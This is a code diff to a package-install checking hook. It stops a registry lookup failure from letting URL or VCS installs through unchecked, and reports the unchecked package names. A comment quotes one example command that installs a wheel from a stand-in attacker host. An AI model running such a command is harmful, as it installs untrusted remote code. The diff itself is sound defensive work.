@@ -825,17 +825,34 @@ async def _run_hook(args: argparse.Namespace, stdin: str) -> int:
         return EXIT_OK
 
     rows: list[CheckRow] = []
+    unchecked: str | None = None
     if requirements:
         try:
             rows, _degraded = await run_check(requirements, args=args)
         except Exception as exc:  # fail open, and say so where the user can see it
-            print(json.dumps({
-                "systemMessage": f"package-doctor could not check this install ({exc}); "
-                                 f"it was allowed unchecked.",
-            }))
-            return EXIT_OK
+            if not remote:
+                print(json.dumps({
+                    "systemMessage": f"package-doctor could not check this install ({exc}); "
+                                     f"it was allowed unchecked.",
+                }))
+                return EXIT_OK
+            # Failing open is for outages: the registry could not answer about
+            # a *name*, so the name is allowed rather than stopping work on
+            # somebody else's downtime. A URL or VCS target in the same command
+            # never needed a registry answer to be blocked, and a lookup error
+            # must not become the way past it - `pip install requests
+            # https://evil.example/pkg.whl` during a PyPI outage is still a
+            # URL install. The names are reported as unchecked; the block
+            # below stands on the URL alone.
+            unchecked = (
+                "UNCHECKED " + ", ".join(requirements)
+                + f": could not be checked ({exc}); allowed on its own, but this "
+                  "command is blocked for the target below"
+            )
 
     lines = _hook_lines(rows)
+    if unchecked:
+        lines.append(unchecked)
     if remote:
         lines.append(
             "BLOCK " + ", ".join(remote) + ": installs directly from a URL or VCS "
